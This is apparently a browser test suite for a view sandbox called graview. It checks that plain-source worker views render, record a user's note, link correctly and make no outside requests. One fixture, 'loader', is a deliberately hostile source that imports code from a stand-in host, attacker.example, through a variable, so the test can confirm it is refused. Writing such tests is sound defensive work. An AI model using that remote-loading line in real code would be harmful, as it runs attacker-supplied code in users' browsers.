/**
 * A VIEW WITH NO BUILD, IN A REAL BROWSER (FR-96): the plain transport of
 * `scripts/guest-sandbox.mjs`.
 *
 * The two worked examples of the `graview-worker-view` skill — a list lens
 * and a home, written from the skill alone — and LifeLogics' package lens
 * are handed to `mountWorkerView` as their plain source text, as a chat
 * writes them: no imports, no bundler, no copy of the protocol. The host
 * puts the runtime in front of each. Over the offers fixture, as Lin: each
 * draws, the list lens takes a note Lin types and presses, the home leads
 * with the recommended package, and a source that says `import` is refused
 * before it runs. The page makes no request but its own.
 */
import { createServer } from "node:http";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { graviewSources } from "./graview-sources.mjs";

const VIEWS = {
  offers: { file: "packages/skills/skills/graview-worker-view/examples/offers-list.js", manifest: { name: "offers", title: "The offers", attach: "offer", cardinality: "many", reads: { kinds: ["package"], edges: ["includes"] }, acts: ["add-note"] } },
  front: { file: "packages/skills/skills/graview-worker-view/examples/front-page.js", manifest: { name: "front", title: "Offers", attach: "home", cardinality: "many", reads: { kinds: ["package", "offer"], edges: ["includes"] } } },
  packages: { file: "scripts/fixtures/views/packages.js", manifest: { name: "packages", title: "The packages", attach: "package", cardinality: "many", reads: { kinds: ["offer"], edges: ["includes"] } } },
};

export async function plainSuite({ repoRoot, build, browser, claim, report, HOST, HOST_PORT }) {
  const sources = Object.fromEntries(Object.entries(VIEWS).map(([name, view]) => [name, readFileSync(resolve(repoRoot, view.file), "utf8")]));
  /* A view that would load code: refused before it runs, though the import hides in a string. */
  sources.loader = `const where = "https://attacker.example/x.js"; graview.onProps(() => graview.render("<p>loaded</p>")); import(where);`;
  const manifests = { ...Object.fromEntries(Object.entries(VIEWS).map(([name, view]) => [name, view.manifest])), loader: { name: "loader", attach: "home", cardinality: "many" } };
  const pageJs = (
    await build({
      stdin: {
        contents: `
import { Store } from "@graview/core";
import { mountWorkerView } from "@graview/guest/host/worker";
import { lin, offersApp, offersSeed } from ${JSON.stringify(resolve(repoRoot, "scripts/fixtures/offers-app.ts"))};
const store = new Store({ schema: offersApp.schema, mutations: offersApp.mutations, policy: offersApp.policy, snapshot: structuredClone(offersSeed) });
const failures = {};
const mounted = {};
const places = [{ as: "the-packages", title: "The packages", kind: "package" }];
const went = [];
for (const [name, source] of Object.entries(window.SOURCES)) {
  const holder = document.createElement("section");
  holder.id = name;
  document.querySelector("main").appendChild(holder);
  mounted[name] = mountWorkerView(holder, { manifest: window.MANIFESTS[name], worker: { source }, store, principal: lin, places: () => places, onNavigate: (to) => went.push(to), onFailure: (reason, detail) => (failures[name] = { reason, detail }) });
}
window.__host = {
  failures,
  went,
  notes: () => store.log.all().map((op) => ({ author: op.author.id, via: op.via, intent: op.intent })),
  started: () => Object.fromEntries(Object.entries(mounted).map(([name, view]) => [name, view.worker !== undefined])),
};
`,
        resolveDir: repoRoot,
        loader: "js",
      },
      bundle: true,
      format: "iife",
      write: false,
      platform: "browser",
      target: "es2022",
      logLevel: "silent",
      define: { "process.env.NODE_ENV": '"production"' },
      plugins: [graviewSources(repoRoot)],
    })
  ).outputFiles[0].text;
  const json = (value) => JSON.stringify(value).replace(/<\/script/gi, "<\\/script");
  const html = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Plain views</title></head><body><main></main><script>window.SOURCES = ${json(sources)}; window.MANIFESTS = ${json(manifests)};</script><script>${pageJs.replace(/<\/script/gi, "<\\/script")}</script></body></html>`;
  const attacker = [];
  const server = createServer((request, response) => {
    if (request.url === "/") {
      response.writeHead(200, { "content-type": "text/html" });
      return response.end(html);
    }
    attacker.push(request.url);
    response.writeHead(404);
    response.end();
  }).listen(HOST_PORT, "127.0.0.1");

  try {
    const context = await browser.newContext();
    const requests = [];
    context.on("request", (request) => requests.push(request.url()));
    const tab = await context.newPage();
    tab.on("pageerror", (error) => report.pageErrors.push(String(error).slice(0, 200)));
    await tab.goto(`${HOST}/`, { waitUntil: "load" });
    const inView = (name, selector) => tab.locator(`#${name} [data-worker-view]`).locator(selector);
    for (const [name, selector] of [["offers", ".row"], ["front", ".card"], ["packages", ".package"]]) await inView(name, selector).first().waitFor({ timeout: 15_000 }).catch(() => {});

    const offers = await inView("offers", ".row a").allTextContents();
    claim("the skill's list lens, written from the guide alone, runs as its plain source: Lin's three offers, cheapest first", JSON.stringify(offers) === JSON.stringify(["Team coaching", "AI strategy sprint", "Copernicus build"]), offers);
    await inView("offers", "input").fill("They want the coaching first");
    await inView("offers", "button").click();
    await tab.waitForFunction(() => window.__host.notes().length === 1, null, { timeout: 5_000 }).catch(() => {});
    const notes = await tab.evaluate(() => window.__host.notes());
    const said = await inView("offers", "p[role=note]").textContent().catch(() => null);
    claim("its note, typed and pressed by Lin, is applied as Lin, through the view, and the view says so", notes.length === 1 && notes[0].author === "party:lifelogics" && notes[0].via === "view:offers" && said === "Noted.", { notes, said });
    await inView("offers", 'a[data-record="offer:coaching"]').click();
    claim("its rows link to their records", JSON.stringify(await tab.evaluate(() => window.__host.went)) === JSON.stringify([{ record: "offer:coaching" }]), await tab.evaluate(() => window.__host.went));

    const front = await tab.evaluate(() => {
      const root = document.querySelector("#front [data-worker-view]").shadowRoot;
      return { lead: root.querySelector(".lead h1")?.textContent, figure: root.querySelector(".figure")?.textContent, cards: [...root.querySelectorAll(".card strong")].map((one) => one.textContent), ring: root.querySelector(".ring .value")?.getAttribute("stroke-dashoffset") };
    });
    claim("the skill's home, written from the guide alone, runs as its plain source: it leads with the recommended package and its total, and a card for each", front.lead === "A way in" && front.figure === "$36,000" && front.cards.length === 3 && front.ring !== undefined, front);
    await inView("front", ".card").first().click();
    claim("its cards link to the place", JSON.stringify((await tab.evaluate(() => window.__host.went)).at(-1)) === JSON.stringify({ place: "the-packages" }));

    const packages = await inView("packages", ".package h3").allTextContents();
    claim("LifeLogics' package lens runs as its plain source", JSON.stringify(packages) === JSON.stringify(["A way in", "The whole thing", "Later on"]), packages);

    const failures = await tab.evaluate(() => window.__host.failures);
    const started = await tab.evaluate(() => window.__host.started());
    claim("a source that says import, even in a string, is refused before it runs, and says why", failures.loader?.reason === "source" && /import/.test(failures.loader.detail ?? "") && started.loader === false, { failure: failures.loader, started: started.loader });
    claim("no other view failed", Object.keys(failures).every((name) => name === "loader"), failures);
    const out = requests.filter((url) => /^https?:/.test(url) && url !== `${HOST}/` && url !== `${HOST}/favicon.ico`);
    claim("the page made no request but its own", out.length === 0 && attacker.filter((url) => url !== "/favicon.ico").length === 0, { out, attacker });
    claim("the page throws nothing", report.pageErrors.length === 0, report.pageErrors);
    await context.close();
  } finally {
    server.close();
  }
}
